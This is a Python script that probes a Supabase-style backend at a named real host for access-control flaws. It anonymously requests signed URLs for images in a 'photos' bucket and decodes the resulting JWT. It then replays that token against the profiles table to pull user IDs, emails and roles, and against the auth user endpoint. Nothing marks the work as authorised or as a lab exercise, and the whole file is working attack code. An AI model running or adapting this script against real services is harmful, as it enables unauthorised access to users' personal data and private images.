import ssl, json, urllib.request, urllib.error, base64, sys
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"

obj = None
with open("photos_all.txt", encoding="utf-8", errors="ignore") as f:
    for line in f:
        line = line.strip()
        if line.endswith(".png"):
            obj = line.split("/")[-1]
            break
print("object:", obj)

def req(method, url, body=None, token=None, extra=None):
    h = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "apikey": KEY}
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, repr(e)

def decode_jwt(tok):
    parts = tok.split(".")
    if len(parts) < 2: return None, None, None
    def dec(p):
        p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    return dec(parts[0]), dec(parts[1]), parts[2][:24] if len(parts) > 2 else None

# anon signing (publishable key only)
st, hd, b = req("POST", SUPA + "/storage/v1/object/sign/photos/" + obj, {"expiresIn": 600})
print("\n[anon sign] status:", st, b[:300])
tok = None
try:
    d = json.loads(b)
    su = d.get("signedURL") or d.get("signedUrl") or ""
    tok = urllib.parse.parse_qs(urllib.parse.urlparse("https://x" + su).query).get("token", [None])[0] if su else None
    print("signedURL:", su[:260])
except Exception as e:
    print("parse err", e)
if tok:
    hdr, payload, sig = decode_jwt(tok)
    print("TOKEN HEADER:", json.dumps(hdr))
    print("TOKEN PAYLOAD:", json.dumps(payload))
else:
    print("no token")

# is the signed-url token accepted by PostgREST as a bearer/apikey?
if tok:
    st, hd, b = req("GET", SUPA + "/rest/v1/profiles?select=user_id,email,role&limit=2", token=tok)
    print("\n[rest with signed-url bearer]", st, b[:300])
    st, hd, b = req("GET", SUPA + "/rest/v1/profiles?select=user_id,email,role&limit=2", extra={"apikey": tok})
    print("[rest with signed-url apikey]", st, b[:300])
    st, hd, b = req("GET", SUPA + "/auth/v1/user", token=tok)
    print("[gotrue user with signed-url token]", st, b[:200])

# does the public URL path read work? (sanity)
st, hd, b = req("GET", SUPA + "/storage/v1/object/public/photos/" + obj)
print("\n[public read]", st, hd.get("Content-Type"), len(b))
